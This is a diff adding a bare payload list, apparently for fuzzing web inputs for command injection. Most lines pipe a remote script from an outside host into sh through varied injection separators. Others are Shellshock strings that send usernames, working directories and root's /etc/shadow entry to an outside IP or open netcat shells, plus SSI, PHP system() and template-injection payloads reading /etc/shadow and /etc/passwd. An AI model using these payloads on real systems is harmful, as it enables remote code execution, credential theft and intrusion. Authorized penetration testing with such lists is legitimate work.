@@ -1,0 +1,89 @@
+$(`curl https://oxagast.org/pwn/shell | sh - `)
+$;/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+%0Acurl https://oxagast.org/pwn/shell | sh - 
+%0a curl https://oxagast.org/pwn/shell | sh -  %0a
+%0Acurl https://oxagast.org/pwn/shell | sh - %0A
+%0A/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+%0A/usr/bin/curl https://oxagast.org/pwn/shell | sh - %0A
+a);curl https://oxagast.org/pwn/shell | sh - 
+a);curl https://oxagast.org/pwn/shell | sh - ;
+a);curl https://oxagast.org/pwn/shell | sh - |
+a);curl https://oxagast.org/pwn/shell | sh -;
+a)|curl https://oxagast.org/pwn/shell | sh - 
+a)|curl https://oxagast.org/pwn/shell | sh - ;
+a)|curl https://oxagast.org/pwn/shell | sh -;
+a;curl https://oxagast.org/pwn/shell | sh - 
+a;curl https://oxagast.org/pwn/shell | sh - ;
+a;curl https://oxagast.org/pwn/shell | sh - |
+a;curl https://oxagast.org/pwn/shell | sh -;
+a|curl https://oxagast.org/pwn/shell | sh - 
+a);/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+a);/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
+a)|/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+a;/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+a;/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
+a|/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+|/bin/ls -al
+cat /etc/hosts
+& curl https://oxagast.org/pwn/shell | sh - 
+& curl https://oxagast.org/pwn/shell | sh -  &
+; curl https://oxagast.org/pwn/shell | sh - 
+;curl https://oxagast.org/pwn/shell | sh - 
+;curl https://oxagast.org/pwn/shell | sh - ;
+;curl https://oxagast.org/pwn/shell | sh - |
+`curl https://oxagast.org/pwn/shell | sh - `
+| curl https://oxagast.org/pwn/shell | sh - 
+||curl https://oxagast.org/pwn/shell | sh -;
+|curl https://oxagast.org/pwn/shell | sh - 
+|curl https://oxagast.org/pwn/shell | sh - ;
+|curl https://oxagast.org/pwn/shell | sh - |
+curl https://oxagast.org/pwn/shell | sh - 
+;curl https://oxagast.org/pwn/shell | sh - \n
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/bin/curl https://oxagast.org/pwn/shell | sh - "-->
+<!--#exec cmd="curl https://oxagast.org/pwn/shell | sh -;-->
+{{ get_user_file("/etc/passwd") }}
+/index.html|curl https://oxagast.org/pwn/shell | sh - |
+&lt;!--#exec%20cmd=&quot;curl https://oxagast.org/pwn/shell | sh -;--&gt;
+&lt;!--#exec%20cmd=&quot;curl https://oxagast.org/pwn/shell | sh - &quot;--&gt;
+\n/bin/ls -al\n
+\ncurl https://oxagast.org/pwn/shell | sh - ;
+\ncurl https://oxagast.org/pwn/shell | sh - |
+\ncurl https://oxagast.org/pwn/shell | sh -;
+\ncurl https://oxagast.org/pwn/shell | sh - \n
+|ncurl https://oxagast.org/pwn/shell | sh - \n
+\n/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
+\n/usr/bin/curl https://oxagast.org/pwn/shell | sh - \n
+<?php system("curl https://oxagast.org/pwn/shell | sh - ");?>
+;system('cat%20/etc/passwd')
+;system('curl https://oxagast.org/pwn/shell | sh - ')
+system('curl https://oxagast.org/pwn/shell | sh - ');
+;system('/usr/bin/curl https://oxagast.org/pwn/shell | sh - ')
+;|/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
+`/usr/bin/curl https://oxagast.org/pwn/shell | sh - `
+|/usr/bin/curl https://oxagast.org/pwn/shell | sh - 
+|/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
+||/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
+;/usr/bin/curl https://oxagast.org/pwn/shell | sh - \n
+|usr/bin/curl https://oxagast.org/pwn/shell | sh - \n
